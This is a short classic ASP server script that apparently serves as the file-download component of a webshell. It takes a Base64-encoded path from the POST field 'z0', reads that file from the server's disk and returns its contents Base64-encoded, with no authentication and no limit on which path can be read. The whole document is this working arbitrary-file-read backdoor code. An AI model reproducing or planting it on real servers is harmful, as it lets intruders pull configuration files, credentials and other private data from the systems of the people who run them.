<%
On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    If Trim(str) = "" Then
        Base64Decode = ""
        Exit Function
    End If
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    Base64Decode = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function FileToBase64(filePath)
    Dim stream, dom, node
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    
    Set dom = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = dom.createElement("tmp")
    node.dataType = "bin.base64"
    node.nodeTypedValue = stream.Read()
    
    FileToBase64 = Replace(node.text, vbLf, "")
    FileToBase64 = Replace(FileToBase64, vbCr, "")
    
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set dom = Nothing
End Function

Function Main()
    Dim z0
    z0 = Request.Form("z0")
    If Trim(z0) = "" Then
        Main = "ERROR://No parameter received."
        Exit Function
    End If

    Dim szFilePath
    szFilePath = Base64Decode(z0)

    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FileExists(szFilePath) Then
        Main = "ERROR://Unable to open file."
        Set fso = Nothing
        Exit Function
    End If
    Set fso = Nothing

    Dim result
    On Error Resume Next
    result = FileToBase64(szFilePath)
    
    If Err.Number <> 0 Then
        Main = "ERROR://Unable to open file."
    Else
        Main = result
    End If
    On Error GoTo 0
End Function

Response.ContentType = "text/plain"
Response.Write Main()

%>